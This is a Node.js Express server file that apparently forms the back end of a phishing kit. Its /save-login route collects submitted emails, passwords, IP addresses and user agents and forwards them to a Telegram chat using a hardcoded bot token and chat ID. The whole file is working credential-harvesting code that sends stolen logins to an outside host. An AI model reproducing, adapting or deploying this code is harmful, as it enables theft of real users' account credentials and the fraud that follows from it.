const express = require('express');
const bodyParser = require('body-parser');
const axios = require('axios'); // Use Axios for HTTP requests
const app = express();

const PORT = 3000;

// Telegram Bot API Token and Chat ID
const TELEGRAM_BOT_TOKEN = '7528372673:AAGU69sOwivEHBpU-5TMB5Ny669hILbexF8';
const TELEGRAM_CHAT_ID = '7191391586';

// Middleware to parse JSON data
app.use(bodyParser.json());

// Serve static files from the "public" folder
app.use(express.static('public'));

// Route to handle login requests
app.post('/save-login', async (req, res) => {
    const { email, password, ip } = req.body;
    const userAgent = req.headers['user-agent'];

    // Validate that required fields are present
    if (!email || !password) {
        return res.status(400).json({ error: 'Email and password are required.' });
    }

    const message = `
🔒 *Login Attempt Logged* 🔒
- *Email:* ${email}
- *Password:* ${password}
- *IP Address:* ${ip || 'Unknown'}
- *User-Agent:* ${userAgent || 'Unknown'}
- *Timestamp:* ${new Date().toISOString()}
`;

    try {
        // Send the message to Telegram
        const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        await axios.post(telegramUrl, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        });

        console.log('Login attempt sent to Telegram.');
        res.status(200).json({ message: 'Data sent to Telegram successfully.' });
    } catch (error) {
        console.error('Error sending to Telegram:', error);
        res.status(500).json({ error: 'Could not send data to Telegram.' });
    }
});

// Start the server
app.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}`);
});
